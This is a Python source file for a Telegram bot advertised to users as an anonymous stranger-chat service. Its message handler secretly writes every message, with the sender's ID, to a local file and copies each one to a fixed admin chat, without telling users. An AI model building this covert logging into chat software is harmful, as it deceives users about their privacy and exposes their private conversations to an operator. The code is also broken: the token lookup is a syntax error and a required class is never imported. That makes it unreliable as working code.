from telegram import ReplyKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
import os
BOT_TOKEN = os.getenv"BOT_TOKEN"
ADMIN_CHAT_ID = 8456493456

waiting = []
pairs = {}

# 🟢 START
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [["🔍 Find Partner"], ["❌ Stop Chat"]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    await update.message.reply_text(
        "🤖 Anonymous Chat Bot\n\nTap button below 👇",
        reply_markup=reply_markup
    )

# 🟢 NEXT CHAT
async def next_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_chat.id

    if user in pairs:
        partner = pairs[user]
        del pairs[user]
        del pairs[partner]
        await context.bot.send_message(partner, "❌ Partner left")

    if user not in waiting:
        waiting.append(user)
        await update.message.reply_text("⏳ Searching...")

    if len(waiting) >= 2:
        u1 = waiting.pop(0)
        u2 = waiting.pop(0)
        pairs[u1] = u2
        pairs[u2] = u1
        await context.bot.send_message(u1, "✅ Connected")
        await context.bot.send_message(u2, "✅ Connected")

# 🟢 STOP
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_chat.id
    if user in pairs:
        partner = pairs[user]
        del pairs[user]
        del pairs[partner]
        await context.bot.send_message(partner, "❌ Chat ended")
    await update.message.reply_text("Stopped")

# 🟢 ADMIN COMMAND
async def users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id == ADMIN_CHAT_ID:
        total_waiting = len(waiting)
        total_active = len(pairs) // 2
        await update.message.reply_text(
            f"👑 Admin Panel\n\n"
            f"Waiting: {total_waiting}\n"
            f"Active Chats: {total_active}"
        )

# 🟢 FORWARD MESSAGES
async def forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sender = update.effective_chat.id
    text = update.message.text

    # BUTTON HANDLING
    if text == "🔍 Find Partner":
        await next_chat(update, context)
        return

    if text == "❌ Stop Chat":
        await stop(update, context)
        return

    # SAVE MESSAGE
    with open("messages.txt", "a", encoding="utf-8") as f:
        f.write(f"{sender}: {text}\n")

    # SEND TO ADMIN
    await context.bot.copy_message(
        chat_id=ADMIN_CHAT_ID,
        from_chat_id=sender,
        message_id=update.message.message_id,
    )

    if sender in pairs:
        receiver = pairs[sender]
        await context.bot.copy_message(
            chat_id=receiver,
            from_chat_id=sender,
            message_id=update.message.message_id,
        )
    else:
        await update.message.reply_text("Click 'Find Partner' 👇")
# 🟢 MAIN
app = ApplicationBuilder().token(BOT_TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("next", next_chat))
app.add_handler(CommandHandler("stop", stop))
app.add_handler(CommandHandler("users", users))  # 👑 NEW
app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, forward))

print("Bot is running...")
app.run_polling()